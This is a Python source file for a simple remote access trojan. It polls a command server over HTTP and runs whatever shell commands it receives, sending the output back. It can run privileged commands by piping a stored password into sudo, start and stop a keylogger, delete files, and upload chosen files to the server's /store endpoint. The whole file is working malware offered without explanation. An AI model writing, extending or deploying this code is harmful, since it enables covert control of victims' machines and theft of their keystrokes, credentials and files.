import requests
import subprocess
import os

http_url = "http://localhost:7000"
global pwd
pwd=''

while True:
    req = requests.get(http_url)
    cmd = req.text

    if 'terminate' in cmd:
        break

    elif 'sudo' in cmd:
	x,c = cmd.split('*')
	if pwd != '':
		sc = "echo {} | sudo -S {}".format(pwd,c)
		cmdpmpt = subprocess.Popen(sc, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		post_resp = requests.post(url=http_url, data=cmdpmpt.stdout.read())

		post_resp = requests.post(url=http_url, data=cmdpmpt.stderr.read())
	else:
		post_resp = requests.post(url=http_url, data='[-]sudo pwd not set')
	
    elif 'setpwd' in cmd:
	x,c = cmd.split('-')
	pwd = c	

    elif 'keylog' in cmd:
        import keylogger
        requests.post(url=http_url, data='[+]keylogger running')

    elif 'finkey' in cmd:
        try:
            keylogger.new_hook.cancel()
            requests.post(url=http_url, data='[+]keylogger stopped')
        except Exception as e:
            requests.post(url=http_url, data='[-]No keylogger running')

    elif 'remove' in cmd:
        remove, path = cmd.split('*')
        if os.path.exists(path):
            os.remove(path)
            requests.post(url=http_url, data='[+]File delete operation successful')
        else:
            requests.post(url=http_url, data='[-]File not found delete operation failed')

    elif 'grab' in cmd:
        grab, path = cmd.split('*')
        if os.path.exists(path):
            url = http_url+'/store'
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url=http_url, data='[-]Not able to find the file !')

    else:
        cmdpmpt = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	
        post_resp = requests.post(url=http_url, data=cmdpmpt.stdout.read())

        post_resp = requests.post(url=http_url, data=cmdpmpt.stderr.read())
